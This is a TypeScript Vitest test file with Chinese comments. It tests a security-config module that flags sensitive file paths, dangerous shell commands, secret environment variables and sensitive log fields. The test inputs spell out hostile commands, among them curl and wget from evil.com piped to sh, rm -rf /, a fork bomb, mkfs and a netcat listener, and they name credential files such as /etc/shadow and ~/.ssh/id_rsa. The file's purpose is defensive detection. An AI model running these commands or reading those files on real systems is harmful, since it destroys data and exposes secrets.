import { describe, it, expect } from 'vitest';
import {
  SENSITIVE_PATH_PATTERNS,
  SENSITIVE_PATH_KEYWORDS,
  DANGEROUS_COMMAND_PATTERNS,
  SENSITIVE_ENV_PREFIXES,
  SENSITIVE_FIELD_KEYWORDS,
  SENSITIVE_RESOURCE_KEYWORDS,
  matchSensitivePath,
  containsSensitiveKeyword,
  matchDangerousCommand,
  isSensitiveEnvVar,
  isSensitiveField,
} from '../security-config.js';

// ============================================================================
// 常量导出验证 - 确保所有安全配置列表正确导出且非空
// ============================================================================
describe('安全配置常量导出', () => {
  it('SENSITIVE_PATH_PATTERNS 是非空只读正则数组', () => {
    expect(Array.isArray(SENSITIVE_PATH_PATTERNS)).toBe(true);
    expect(SENSITIVE_PATH_PATTERNS.length).toBeGreaterThan(0);
    for (const p of SENSITIVE_PATH_PATTERNS) {
      expect(p).toBeInstanceOf(RegExp);
    }
  });

  it('SENSITIVE_PATH_KEYWORDS 是非空只读字符串数组', () => {
    expect(Array.isArray(SENSITIVE_PATH_KEYWORDS)).toBe(true);
    expect(SENSITIVE_PATH_KEYWORDS.length).toBeGreaterThan(0);
    for (const kw of SENSITIVE_PATH_KEYWORDS) {
      expect(typeof kw).toBe('string');
      expect(kw.length).toBeGreaterThan(0);
    }
  });

  it('DANGEROUS_COMMAND_PATTERNS 是非空只读正则数组', () => {
    expect(Array.isArray(DANGEROUS_COMMAND_PATTERNS)).toBe(true);
    expect(DANGEROUS_COMMAND_PATTERNS.length).toBeGreaterThan(0);
    for (const p of DANGEROUS_COMMAND_PATTERNS) {
      expect(p).toBeInstanceOf(RegExp);
    }
  });

  it('SENSITIVE_ENV_PREFIXES 是非空只读字符串数组', () => {
    expect(Array.isArray(SENSITIVE_ENV_PREFIXES)).toBe(true);
    expect(SENSITIVE_ENV_PREFIXES.length).toBeGreaterThan(0);
    for (const prefix of SENSITIVE_ENV_PREFIXES) {
      expect(typeof prefix).toBe('string');
      expect(prefix.length).toBeGreaterThan(0);
    }
  });

  it('SENSITIVE_FIELD_KEYWORDS 是非空只读字符串数组', () => {
    expect(Array.isArray(SENSITIVE_FIELD_KEYWORDS)).toBe(true);
    expect(SENSITIVE_FIELD_KEYWORDS.length).toBeGreaterThan(0);
    for (const kw of SENSITIVE_FIELD_KEYWORDS) {
      expect(typeof kw).toBe('string');
      expect(kw.length).toBeGreaterThan(0);
    }
  });

  it('SENSITIVE_RESOURCE_KEYWORDS 是非空只读字符串数组', () => {
    expect(Array.isArray(SENSITIVE_RESOURCE_KEYWORDS)).toBe(true);
    expect(SENSITIVE_RESOURCE_KEYWORDS.length).toBeGreaterThan(0);
    for (const kw of SENSITIVE_RESOURCE_KEYWORDS) {
      expect(typeof kw).toBe('string');
      expect(kw.length).toBeGreaterThan(0);
    }
  });
});

// ============================================================================
// matchSensitivePath - 敏感路径正则黑名单检测
// ============================================================================
describe('matchSensitivePath 敏感路径检测', () => {
  describe('正常匹配', () => {
    it('匹配 .ssh 目录路径', () => {
      const result = matchSensitivePath('/home/user/.ssh/id_rsa');
      expect(result).not.toBeNull();
      expect(result).toBeInstanceOf(RegExp);
    });

    it('匹配 .env 文件（结尾）', () => {
      expect(matchSensitivePath('/project/.env')).not.toBeNull();
    });

    it('匹配 .env.local 文件（后跟点）', () => {
      expect(matchSensitivePath('/project/.env.local')).not.toBeNull();
    });

    it('匹配 AWS 凭证文件', () => {
      expect(matchSensitivePath('/root/.aws/credentials')).not.toBeNull();
    });

    it('匹配 /etc/passwd', () => {
      expect(matchSensitivePath('/etc/passwd')).not.toBeNull();
    });

    it('匹配 /etc/shadow', () => {
      expect(matchSensitivePath('/etc/shadow')).not.toBeNull();
    });

    it('匹配 /etc/sudoers', () => {
      expect(matchSensitivePath('/etc/sudoers')).not.toBeNull();
    });

    it('匹配 .git/config', () => {
      expect(matchSensitivePath('/repo/.git/config')).not.toBeNull();
    });

    it('匹配 authorized_keys', () => {
      expect(matchSensitivePath('/home/user/.ssh/authorized_keys')).not.toBeNull();
    });

    it('匹配 .npmrc', () => {
      expect(matchSensitivePath('/home/user/.npmrc')).not.toBeNull();
    });

    it('匹配 .pypirc', () => {
      expect(matchSensitivePath('/home/user/.pypirc')).not.toBeNull();
    });

    it('匹配 .docker/config.json', () => {
      expect(matchSensitivePath('/home/user/.docker/config.json')).not.toBeNull();
    });

    it('匹配 id_ed25519', () => {
      expect(matchSensitivePath('/home/user/.ssh/id_ed25519')).not.toBeNull();
    });
  });

  describe('Windows 路径兼容（反斜杠规范化）', () => {
    it('反斜杠路径匹配 .ssh', () => {
      expect(matchSensitivePath('C:\\Users\\user\\.ssh\\id_rsa')).not.toBeNull();
    });

    it('反斜杠路径匹配 Windows system32 config', () => {
      expect(matchSensitivePath('C:\\Windows\\System32\\config\\SAM')).not.toBeNull();
    });

    it('反斜杠路径匹配 Windows repair', () => {
      expect(matchSensitivePath('C:\\Windows\\Repair\\')).not.toBeNull();
    });

    it('反斜杠路径匹配 AppData Credentials', () => {
      expect(
        matchSensitivePath('C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Credentials\\file'),
      ).not.toBeNull();
    });
  });

  describe('大小写不敏感', () => {
    it('大写 .SSH 路径匹配', () => {
      expect(matchSensitivePath('/HOME/USER/.SSH/ID_RSA')).not.toBeNull();
    });

    it('混合大小写 .Env 匹配', () => {
      expect(matchSensitivePath('/project/.Env')).not.toBeNull();
    });

    it('大写 /ETC/PASSWD 匹配', () => {
      expect(matchSensitivePath('/ETC/PASSWD')).not.toBeNull();
    });
  });

  describe('边界情况 - .env 模式精确匹配', () => {
    it('.environment 不应匹配 .env 模式', () => {
      // 模式 /\/\.env($|\.)/i 要求 .env 后是结尾或点
      expect(matchSensitivePath('/project/.environment')).toBeNull();
    });

    it('.envrc 不应匹配 .env 模式', () => {
      expect(matchSensitivePath('/project/.envrc')).toBeNull();
    });

    it('.env.txt 应匹配（后跟点）', () => {
      expect(matchSensitivePath('/project/.env.txt')).not.toBeNull();
    });
  });

  describe('不匹配情况', () => {
    it('普通文件路径不匹配', () => {
      expect(matchSensitivePath('/home/user/documents/file.txt')).toBeNull();
    });

    it('普通代码路径不匹配', () => {
      expect(matchSensitivePath('/project/src/index.ts')).toBeNull();
    });

    it('普通配置文件不匹配', () => {
      expect(matchSensitivePath('/project/config.yaml')).toBeNull();
    });
  });

  describe('返回值类型', () => {
    it('匹配时返回 RegExp 对象', () => {
      const result = matchSensitivePath('/home/user/.ssh/id_rsa');
      expect(result).toBeInstanceOf(RegExp);
    });

    it('返回的对象 source 是字符串', () => {
      const result = matchSensitivePath('/etc/passwd');
      expect(result).not.toBeNull();
      expect(typeof result!.source).toBe('string');
    });

    it('返回的模式来自 SENSITIVE_PATH_PATTERNS 数组', () => {
      const result = matchSensitivePath('/etc/passwd');
      expect(result).not.toBeNull();
      expect(SENSITIVE_PATH_PATTERNS).toContain(result);
    });
  });

  describe('非法输入', () => {
    it('空字符串返回 null', () => {
      expect(matchSensitivePath('')).toBeNull();
    });

    it('null 输入返回 null', () => {
      expect(matchSensitivePath(null as unknown as string)).toBeNull();
    });

    it('undefined 输入返回 null', () => {
      expect(matchSensitivePath(undefined as unknown as string)).toBeNull();
    });

    it('数字输入返回 null', () => {
      expect(matchSensitivePath(123 as unknown as string)).toBeNull();
    });
  });
});

// ============================================================================
// containsSensitiveKeyword - 敏感路径关键词轻量级检测
// ============================================================================
describe('containsSensitiveKeyword 敏感关键词检测', () => {
  describe('正常匹配', () => {
    it('路径包含 .env', () => {
      expect(containsSensitiveKeyword('/project/.env')).toBe(true);
    });

    it('路径包含 credentials', () => {
      expect(containsSensitiveKeyword('/path/credentials.json')).toBe(true);
    });

    it('路径包含 password', () => {
      expect(containsSensitiveKeyword('/path/password.txt')).toBe(true);
    });

    it('路径包含 secret', () => {
      expect(containsSensitiveKeyword('/path/secret.key')).toBe(true);
    });

    it('路径包含 token', () => {
      expect(containsSensitiveKeyword('/path/token.dat')).toBe(true);
    });

    it('路径包含 key.json', () => {
      expect(containsSensitiveKeyword('/path/key.json')).toBe(true);
    });

    it('路径包含 id_rsa', () => {
      expect(containsSensitiveKeyword('/path/id_rsa')).toBe(true);
    });

    it('路径包含 .ssh/', () => {
      expect(containsSensitiveKeyword('/home/u/.ssh/config')).toBe(true);
    });

    it('路径包含 config.json', () => {
      expect(containsSensitiveKeyword('/path/config.json')).toBe(true);
    });
  });

  describe('大小写不敏感', () => {
    it('大写 PASSWORD 匹配', () => {
      expect(containsSensitiveKeyword('/PATH/PASSWORD.TXT')).toBe(true);
    });

    it('混合大小写 Token 匹配', () => {
      expect(containsSensitiveKeyword('/path/Token.dat')).toBe(true);
    });

    it('大写 .ENV 匹配', () => {
      expect(containsSensitiveKeyword('/project/.ENV')).toBe(true);
    });
  });

  describe('Windows 路径兼容', () => {
    it('反斜杠路径包含 .ssh/（规范化后匹配）', () => {
      // 反斜杠会被规范化为 /，所以 .ssh\ 会变成 .ssh/
      expect(containsSensitiveKeyword('C:\\Users\\u\\.ssh\\key')).toBe(true);
    });

    it('反斜杠路径包含 credentials', () => {
      expect(containsSensitiveKeyword('C:\\app\\credentials.json')).toBe(true);
    });
  });

  describe('不匹配情况', () => {
    it('普通文件路径不匹配', () => {
      expect(containsSensitiveKeyword('/home/user/file.txt')).toBe(false);
    });

    it('普通代码路径不匹配', () => {
      expect(containsSensitiveKeyword('/project/src/index.ts')).toBe(false);
    });

    it('仅包含 key 但不是 key.json 不匹配', () => {
      // 关键词是 'key.json'，不是 'key'
      expect(containsSensitiveKeyword('/path/key.txt')).toBe(false);
    });

    it('仅包含 config 但不是 config.json 不匹配', () => {
      expect(containsSensitiveKeyword('/path/config.yaml')).toBe(false);
    });
  });

  describe('非法输入', () => {
    it('空字符串返回 false', () => {
      expect(containsSensitiveKeyword('')).toBe(false);
    });

    it('null 输入返回 false', () => {
      expect(containsSensitiveKeyword(null as unknown as string)).toBe(false);
    });

    it('undefined 输入返回 false', () => {
      expect(containsSensitiveKeyword(undefined as unknown as string)).toBe(false);
    });

    it('数字输入返回 false', () => {
      expect(containsSensitiveKeyword(123 as unknown as string)).toBe(false);
    });
  });
});

// ============================================================================
// matchDangerousCommand - 危险命令正则黑名单检测
// ============================================================================
describe('matchDangerousCommand 危险命令检测', () => {
  describe('文件破坏命令', () => {
    it('rm -rf / 匹配', () => {
      expect(matchDangerousCommand('rm -rf /')).not.toBeNull();
    });

    it('rm -rf * 匹配', () => {
      expect(matchDangerousCommand('rm -rf *')).not.toBeNull();
    });

    it('rm -rf ~ 匹配', () => {
      expect(matchDangerousCommand('rm -rf ~')).not.toBeNull();
    });

    it('rm -rf /home/user 匹配（以 / 开头）', () => {
      expect(matchDangerousCommand('rm -rf /home/user')).not.toBeNull();
    });

    it('rmdir /s 匹配', () => {
      expect(matchDangerousCommand('rmdir /s /q C:\\folder')).not.toBeNull();
    });

    it('rd /q 匹配', () => {
      expect(matchDangerousCommand('rd /q C:\\folder')).not.toBeNull();
    });
  });

  describe('系统操作命令', () => {
    it('shutdown 匹配', () => {
      expect(matchDangerousCommand('shutdown now')).not.toBeNull();
    });

    it('reboot 匹配', () => {
      expect(matchDangerousCommand('reboot')).not.toBeNull();
    });

    it('halt 匹配', () => {
      expect(matchDangerousCommand('halt')).not.toBeNull();
    });

    it('format c: 匹配', () => {
      expect(matchDangerousCommand('format c:')).not.toBeNull();
    });

    it('taskkill /f 匹配', () => {
      expect(matchDangerousCommand('taskkill /f /im node.exe')).not.toBeNull();
    });

    it('kill -9 匹配', () => {
      expect(matchDangerousCommand('kill -9 1234')).not.toBeNull();
    });

    it('killall 匹配', () => {
      expect(matchDangerousCommand('killall node')).not.toBeNull();
    });
  });

  describe('用户与权限命令', () => {
    it('net user 匹配', () => {
      expect(matchDangerousCommand('net user admin password123')).not.toBeNull();
    });

    it('useradd 匹配', () => {
      expect(matchDangerousCommand('useradd newuser')).not.toBeNull();
    });

    it('userdel 匹配', () => {
      expect(matchDangerousCommand('userdel olduser')).not.toBeNull();
    });

    it('passwd 命令匹配', () => {
      expect(matchDangerousCommand('passwd root')).not.toBeNull();
    });

    it('chmod 777 / 匹配', () => {
      expect(matchDangerousCommand('chmod 777 /')).not.toBeNull();
    });

    it('chown -R 匹配', () => {
      expect(matchDangerousCommand('chown -R user:group /path')).not.toBeNull();
    });
  });

  describe('注册表与系统配置', () => {
    it('reg delete 匹配', () => {
      expect(matchDangerousCommand('reg delete HKLM\\Software')).not.toBeNull();
    });

    it('reg add 匹配', () => {
      expect(matchDangerousCommand('reg add HKLM\\Software\\App')).not.toBeNull();
    });

    it('regedit 匹配', () => {
      expect(matchDangerousCommand('regedit')).not.toBeNull();
    });
  });

  describe('加密擦除与设备破坏', () => {
    it('cipher /w 匹配', () => {
      expect(matchDangerousCommand('cipher /w:C:\\')).not.toBeNull();
    });

    it('shred 匹配', () => {
      expect(matchDangerousCommand('shred /path/file')).not.toBeNull();
    });

    it('wipe 匹配', () => {
      expect(matchDangerousCommand('wipe /path/file')).not.toBeNull();
    });

    it('mkfs 匹配', () => {
      expect(matchDangerousCommand('mkfs.ext4 /dev/sda1')).not.toBeNull();
    });

    it('重定向写入 /dev/sd 设备匹配', () => {
      // 模式 />\s*\/dev\/sd[a-z]/i 要求 > 重定向到 /dev/sd 设备
      expect(matchDangerousCommand('cat img.iso > /dev/sda')).not.toBeNull();
    });
  });

  describe('网络攻击与远程执行', () => {
    it('nc -l 匹配', () => {
      expect(matchDangerousCommand('nc -l 4444')).not.toBeNull();
    });

    it('netcat 匹配', () => {
      expect(matchDangerousCommand('netcat example.com 4444')).not.toBeNull();
    });

    it('nmap 匹配', () => {
      expect(matchDangerousCommand('nmap -sS 192.168.1.1')).not.toBeNull();
    });

    it('curl pipe to sh 匹配', () => {
      expect(matchDangerousCommand('curl http://evil.com/script.sh | sh')).not.toBeNull();
    });

    it('wget pipe to sh 匹配', () => {
      expect(matchDangerousCommand('wget http://evil.com/script.sh | sh')).not.toBeNull();
    });
  });

  describe('进程注入与编码执行', () => {
    it('inject 匹配', () => {
      expect(matchDangerousCommand('inject dll')).not.toBeNull();
    });

    it('dll inject 匹配', () => {
      expect(matchDangerousCommand('dll inject process')).not.toBeNull();
    });

    it('powershell -enc 匹配', () => {
      expect(matchDangerousCommand('powershell -enc base64data')).not.toBeNull();
    });

    it('bash -c 匹配', () => {
      expect(matchDangerousCommand('bash -c "rm file"')).not.toBeNull();
    });
  });

  describe('包管理器全局卸载', () => {
    it('npm uninstall -g 匹配', () => {
      expect(matchDangerousCommand('npm uninstall -g pkg')).not.toBeNull();
    });

    it('pip uninstall 匹配', () => {
      expect(matchDangerousCommand('pip uninstall pkg')).not.toBeNull();
    });
  });

  describe('fork bomb', () => {
    it('fork bomb 模式匹配', () => {
      expect(matchDangerousCommand(':(){ :|:& };')).not.toBeNull();
    });
  });

  describe('安全命令不匹配', () => {
    it('ls -la 不匹配', () => {
      expect(matchDangerousCommand('ls -la')).toBeNull();
    });

    it('echo hello 不匹配', () => {
      expect(matchDangerousCommand('echo hello')).toBeNull();
    });

    it('npm install 不匹配', () => {
      expect(matchDangerousCommand('npm install')).toBeNull();
    });

    it('git status 不匹配', () => {
      expect(matchDangerousCommand('git status')).toBeNull();
    });

    it('node app.js 不匹配', () => {
      expect(matchDangerousCommand('node app.js')).toBeNull();
    });

    it('rm file.txt 不匹配（非 -rf）', () => {
      expect(matchDangerousCommand('rm file.txt')).toBeNull();
    });

    it('npm uninstall（非全局）不匹配', () => {
      expect(matchDangerousCommand('npm uninstall pkg')).toBeNull();
    });
  });

  describe('边界情况', () => {
    it('带前后空格的命令匹配（会被 trim）', () => {
      expect(matchDangerousCommand('  shutdown  ')).not.toBeNull();
    });

    it('返回值为 RegExp 对象', () => {
      const result = matchDangerousCommand('shutdown');
      expect(result).toBeInstanceOf(RegExp);
    });

    it('返回的模式来自 DANGEROUS_COMMAND_PATTERNS 数组', () => {
      const result = matchDangerousCommand('shutdown');
      expect(result).not.toBeNull();
      expect(DANGEROUS_COMMAND_PATTERNS).toContain(result);
    });
  });

  describe('非法输入', () => {
    it('空字符串返回 null', () => {
      expect(matchDangerousCommand('')).toBeNull();
    });

    it('null 输入返回 null', () => {
      expect(matchDangerousCommand(null as unknown as string)).toBeNull();
    });

    it('undefined 输入返回 null', () => {
      expect(matchDangerousCommand(undefined as unknown as string)).toBeNull();
    });

    it('数字输入返回 null', () => {
      expect(matchDangerousCommand(123 as unknown as string)).toBeNull();
    });
  });
});

// ============================================================================
// isSensitiveEnvVar - 敏感环境变量检测
// ============================================================================
describe('isSensitiveEnvVar 敏感环境变量检测', () => {
  describe('正常匹配（精确前缀）', () => {
    it('API_KEY 匹配', () => {
      expect(isSensitiveEnvVar('API_KEY')).toBe(true);
    });

    it('SECRET 匹配', () => {
      expect(isSensitiveEnvVar('SECRET')).toBe(true);
    });

    it('TOKEN 匹配', () => {
      expect(isSensitiveEnvVar('TOKEN')).toBe(true);
    });

    it('PASSWORD 匹配', () => {
      expect(isSensitiveEnvVar('PASSWORD')).toBe(true);
    });

    it('PRIVATE_KEY 匹配', () => {
      expect(isSensitiveEnvVar('PRIVATE_KEY')).toBe(true);
    });

    it('ACCESS_KEY 匹配', () => {
      expect(isSensitiveEnvVar('ACCESS_KEY')).toBe(true);
    });

    it('AUTH 匹配', () => {
      expect(isSensitiveEnvVar('AUTH')).toBe(true);
    });

    it('CREDENTIAL 匹配', () => {
      expect(isSensitiveEnvVar('CREDENTIAL')).toBe(true);
    });

    it('CERTIFICATE 匹配', () => {
      expect(isSensitiveEnvVar('CERTIFICATE')).toBe(true);
    });
  });

  describe('子串匹配（变量名包含前缀）', () => {
    it('MY_API_KEY 匹配（包含 API_KEY）', () => {
      expect(isSensitiveEnvVar('MY_API_KEY')).toBe(true);
    });

    it('DB_PASSWORD 匹配（包含 PASSWORD）', () => {
      expect(isSensitiveEnvVar('DB_PASSWORD')).toBe(true);
    });

    it('ACCESS_TOKEN 匹配（包含 TOKEN）', () => {
      expect(isSensitiveEnvVar('ACCESS_TOKEN')).toBe(true);
    });

    it('AUTHORIZATION 匹配（包含 AUTH）', () => {
      expect(isSensitiveEnvVar('AUTHORIZATION')).toBe(true);
    });

    it('access_key_id 匹配（包含 ACCESS_KEY）', () => {
      expect(isSensitiveEnvVar('access_key_id')).toBe(true);
    });

    it('certificate_path 匹配（包含 CERTIFICATE）', () => {
      expect(isSensitiveEnvVar('certificate_path')).toBe(true);
    });
  });

  describe('大小写不敏感', () => {
    it('小写 api_key 匹配', () => {
      expect(isSensitiveEnvVar('api_key')).toBe(true);
    });

    it('小写 secret 匹配', () => {
      expect(isSensitiveEnvVar('secret')).toBe(true);
    });

    it('小写 password 匹配', () => {
      expect(isSensitiveEnvVar('password')).toBe(true);
    });

    it('混合大小写 Token 匹配', () => {
      expect(isSensitiveEnvVar('Token')).toBe(true);
    });
  });

  describe('不匹配情况', () => {
    it('PATH 不匹配', () => {
      expect(isSensitiveEnvVar('PATH')).toBe(false);
    });

    it('HOME 不匹配', () => {
      expect(isSensitiveEnvVar('HOME')).toBe(false);
    });

    it('NODE_ENV 不匹配', () => {
      expect(isSensitiveEnvVar('NODE_ENV')).toBe(false);
    });

    it('PORT 不匹配', () => {
      expect(isSensitiveEnvVar('PORT')).toBe(false);
    });

    it('APIKEY 不匹配（无下划线，不包含 API_KEY）', () => {
      expect(isSensitiveEnvVar('APIKEY')).toBe(false);
    });
  });

  describe('非法输入', () => {
    it('空字符串返回 false', () => {
      expect(isSensitiveEnvVar('')).toBe(false);
    });

    it('null 输入返回 false', () => {
      expect(isSensitiveEnvVar(null as unknown as string)).toBe(false);
    });

    it('undefined 输入返回 false', () => {
      expect(isSensitiveEnvVar(undefined as unknown as string)).toBe(false);
    });
  });
});

// ============================================================================
// isSensitiveField - 敏感字段检测（用于日志脱敏）
// ============================================================================
describe('isSensitiveField 敏感字段检测', () => {
  describe('正常匹配（精确关键词）', () => {
    it('password 匹配', () => {
      expect(isSensitiveField('password')).toBe(true);
    });

    it('token 匹配', () => {
      expect(isSensitiveField('token')).toBe(true);
    });

    it('secret 匹配', () => {
      expect(isSensitiveField('secret')).toBe(true);
    });

    it('apikey 匹配', () => {
      expect(isSensitiveField('apikey')).toBe(true);
    });

    it('api_key 匹配', () => {
      expect(isSensitiveField('api_key')).toBe(true);
    });

    it('credential 匹配', () => {
      expect(isSensitiveField('credential')).toBe(true);
    });

    it('privatekey 匹配', () => {
      expect(isSensitiveField('privatekey')).toBe(true);
    });

    it('private_key 匹配', () => {
      expect(isSensitiveField('private_key')).toBe(true);
    });

    it('auth 匹配', () => {
      expect(isSensitiveField('auth')).toBe(true);
    });
  });

  describe('子串匹配（字段名包含关键词）', () => {
    it('userPassword 匹配（包含 password）', () => {
      expect(isSensitiveField('userPassword')).toBe(true);
    });

    it('accessToken 匹配（包含 token）', () => {
      expect(isSensitiveField('accessToken')).toBe(true);
    });

    it('authorization 匹配（包含 auth）', () => {
      expect(isSensitiveField('authorization')).toBe(true);
    });

    it('my_secret_field 匹配（包含 secret）', () => {
      expect(isSensitiveField('my_secret_field')).toBe(true);
    });

    it('credential_data 匹配（包含 credential）', () => {
      expect(isSensitiveField('credential_data')).toBe(true);
    });

    it('authority 匹配（包含 auth）', () => {
      expect(isSensitiveField('authority')).toBe(true);
    });
  });

  describe('大小写不敏感', () => {
    it('PASSWORD 匹配', () => {
      expect(isSensitiveField('PASSWORD')).toBe(true);
    });

    it('Token 匹配', () => {
      expect(isSensitiveField('Token')).toBe(true);
    });

    it('API_KEY 匹配', () => {
      expect(isSensitiveField('API_KEY')).toBe(true);
    });

    it('PRIVATEKEY 匹配', () => {
      expect(isSensitiveField('PRIVATEKEY')).toBe(true);
    });
  });

  describe('不匹配情况', () => {
    it('name 不匹配', () => {
      expect(isSensitiveField('name')).toBe(false);
    });

    it('email 不匹配', () => {
      expect(isSensitiveField('email')).toBe(false);
    });

    it('age 不匹配', () => {
      expect(isSensitiveField('age')).toBe(false);
    });

    it('username 不匹配（不含任何关键词）', () => {
      expect(isSensitiveField('username')).toBe(false);
    });

    it('description 不匹配', () => {
      expect(isSensitiveField('description')).toBe(false);
    });
  });

  describe('非法输入', () => {
    it('空字符串返回 false', () => {
      expect(isSensitiveField('')).toBe(false);
    });

    it('null 输入返回 false', () => {
      expect(isSensitiveField(null as unknown as string)).toBe(false);
    });

    it('undefined 输入返回 false', () => {
      expect(isSensitiveField(undefined as unknown as string)).toBe(false);
    });

    it('数字输入返回 false', () => {
      expect(isSensitiveField(0 as unknown as string)).toBe(false);
    });
  });
});
